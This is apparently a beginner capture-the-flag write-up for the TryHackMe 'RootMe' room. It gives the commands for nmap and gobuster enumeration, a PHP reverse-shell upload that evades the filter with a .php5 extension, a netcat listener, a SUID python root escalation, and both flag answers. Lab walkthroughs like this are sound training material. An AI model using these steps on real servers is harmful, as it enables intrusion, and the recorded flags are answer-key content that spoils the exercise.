# [RootMe](https://tryhackme.com/room/rrootme)

> A ctf for beginners, can you root me?

## Scanning

Scan ports using nmap

```
nmap -A -T4 10.10.124.205
```

![image](https://user-images.githubusercontent.com/90561566/185150824-10d60d8a-863d-4d46-a0cc-e73a1b4a6564.png)

We found 2 open ports 22 (ssh) and 80 (http)

## HTTP

Go to web page and view source, nothing here

![image](https://user-images.githubusercontent.com/90561566/185151799-787cf8d6-0181-4108-9e5f-5f58c40a78f1.png)

## Enumeration

We use gobuster to enummerate directory on web server

```
gobuster dir -u http://10.10.124.205/ -w /usr/share/wordlists/dirb/common.txt -t 30
```

![image](https://user-images.githubusercontent.com/90561566/185151165-ba637adf-7163-411b-82a3-c5cb4b55b00b.png)

we can see hidden directory called /panel/

we access to /panel/ directory and see a page like this

![image](https://user-images.githubusercontent.com/90561566/185151923-c2a7b30c-c64b-4fe0-8055-71d086bed059.png)

## Exploitation

This step requires us to upload a webshell, in Kali has one `/usr/share/webshells/php/php-reverse-shell.php`

```
cp /usr/share/webshells/php/php-reverse-shell.php reverse.php
vi reverse.php
```

![image](https://user-images.githubusercontent.com/90561566/185154118-fc350cae-82f7-44a5-be22-ee66845e1802.png)

at line 49,50 change ip to your machine and port is 4444 (you can choose another)

Let's upload it to the panel

![image](https://user-images.githubusercontent.com/90561566/185154791-fa36b086-3be3-4900-906d-03a5b7db3281.png)

Looks like the exploit is being declined, let search `file upload bypass php`

So we can change its extension to .phtml, .php, .php3, .php4, .php5, and .inc

```
mv reverse.php reverse.php5
```

![image](https://user-images.githubusercontent.com/90561566/185155614-a2186136-88f5-448c-9f33-9fe636f9672c.png)

the trick has successful

![image](https://user-images.githubusercontent.com/90561566/185155819-cecf03bd-22d5-4a76-a40a-f502177bb659.png)

Now we need to setup netcat on our machine to listen reverse shell

```
nc -lnvp 4444
```

back to gobuster output, go to /uploads/ directory

![image](https://user-images.githubusercontent.com/90561566/185156529-ba2b2f5e-42f9-4837-bfe6-41e9d8a6a3d9.png)

open it and go back the netcat

![image](https://user-images.githubusercontent.com/90561566/185157240-b2555a36-83a8-4a42-8454-f1ef8a2b68c2.png)

![image](https://user-images.githubusercontent.com/90561566/185157418-b272cbbb-fc87-4e00-b61f-c3a0b22f32d0.png)

the answer on this location

```
find / -name user.txt 2>/dev/null
```

![image](https://user-images.githubusercontent.com/90561566/185158854-16fa3345-3891-4f22-af75-060564f2f28b.png)

| Flag | user.txt |
| --- | --- |
| Answer | THM{y0u_g0t_a_sh3ll} |

## Privilege Escalation

The first step is to search for files with SUID permissions

```
find / -user root -perm /4000 2>/dev/null
```

![image](https://user-images.githubusercontent.com/90561566/185160041-9c37daa0-b802-4d84-8a10-0857ec5d2e48.png)

we found a lot of files with SUID permissions

i can see `/usr/bin/python` that mean we can execute python with root privileges

using [gtfobins/python/suid](https://gtfobins.github.io/gtfobins/python/#suid), i found a command

```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

![image](https://user-images.githubusercontent.com/90561566/185163596-9782ef45-09e4-40de-93ef-11067ba3b2b8.png)

| Flag | root.txt |
| --- | --- |
| Answer | THM{pr1v1l3g3_3sc4l4t10n} |
